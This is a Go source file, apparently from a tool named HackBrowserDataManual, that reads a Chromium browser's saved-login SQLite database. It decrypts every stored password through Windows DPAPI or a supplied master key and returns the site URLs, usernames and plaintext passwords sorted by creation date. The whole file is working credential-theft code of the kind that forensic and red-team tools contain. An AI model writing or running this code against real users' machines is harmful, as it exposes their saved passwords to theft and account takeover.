package data

import (
	"HackBrowserDataManual/crypto"
	"HackBrowserDataManual/utils"
	"database/sql"
	_ "github.com/mattn/go-sqlite3"
	log "github.com/sirupsen/logrus"
	"sort"
	"time"
)

const (
	queryChromiumLogin = `SELECT origin_url, username_value, password_value, date_created FROM logins`
)

type PasswordManager struct {
	*Manager
}

type PasswordsData struct {
	UserName    string
	encryptPass []byte
	encryptUser []byte
	Password    string
	LoginURL    string
	CreateDate  time.Time
}

func (pm *PasswordManager) Parse(masterKey []byte, dbfile string) error {
	db, err := sql.Open("sqlite3", dbfile)
	if err != nil {
		return err
	}
	defer db.Close()
	log.Info("Reading sqlite")
	rows, err := db.Query(queryChromiumLogin)
	if err != nil {
		return err
	}
	passwords := make([]*PasswordsData, 0, 256)
	for rows.Next() {
		var (
			url, username string
			pwd, password []byte
			create        int64
		)
		if err := rows.Scan(&url, &username, &pwd, &create); err != nil {
			log.Warn(err)
		}
		login := PasswordsData{
			UserName:    username,
			encryptPass: pwd,
			LoginURL:    url,
		}
		if len(pwd) > 0 {
			if len(masterKey) == 0 {
				password, err = crypto.DPAPI(pwd)
			} else {
				password, err = crypto.DecryptPass(masterKey, pwd)
			}
			if err != nil {
				log.Error(err)
			}
		}
		if create > time.Now().Unix() {
			login.CreateDate = utils.TimeEpoch(create)
		} else {
			login.CreateDate = utils.TimeStamp(create)
		}
		login.Password = string(password)
		passwords = append(passwords, &login)
	}
	sort.Slice(passwords, func(i, j int) bool {
		return passwords[i].CreateDate.After(passwords[j].CreateDate)
	})
	pm.InnerData = &passwords
	return nil
}
